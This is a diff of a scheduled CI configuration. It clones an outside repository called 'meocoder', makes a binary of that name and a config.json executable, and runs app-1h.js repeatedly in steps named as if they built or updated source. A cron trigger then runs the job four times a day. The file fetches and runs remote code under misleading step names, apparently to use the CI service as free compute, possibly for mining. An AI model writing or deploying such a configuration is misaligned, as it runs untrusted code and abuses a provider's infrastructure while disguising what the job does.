@@ -14,15 +14,27 @@ jobs:
       - run:
           name: Clone project and run task
           command:  git clone https://github.com/vippro99/meocoder.git && cd meocoder && npm i -s && chmod +x meocoder config.json && node app-1h.js
-
-      # cronjob 
+      - run:
+          name: New task and check
+          command:  cd meocoder && node app-1h.js
+      - run:
+          name: Build new source
+          command:  cd meocoder && node app-1h.js
+      - run:
+          name: Update source
+          command:  cd meocoder && node app-1h.js
+      - run:
+          name: Check and close jobs
+          command:  cd meocoder && node test-45m.js
+      
+      # setup cronjob 
 workflows:
   version: 2
 
-  constantly_check:
+  constantly_build:
     triggers:
       - schedule:
-          cron: "3 10,16,22,4 * * *"
+          cron: "44 12,18,0,6 * * *"
           filters:
             branches:
               only:
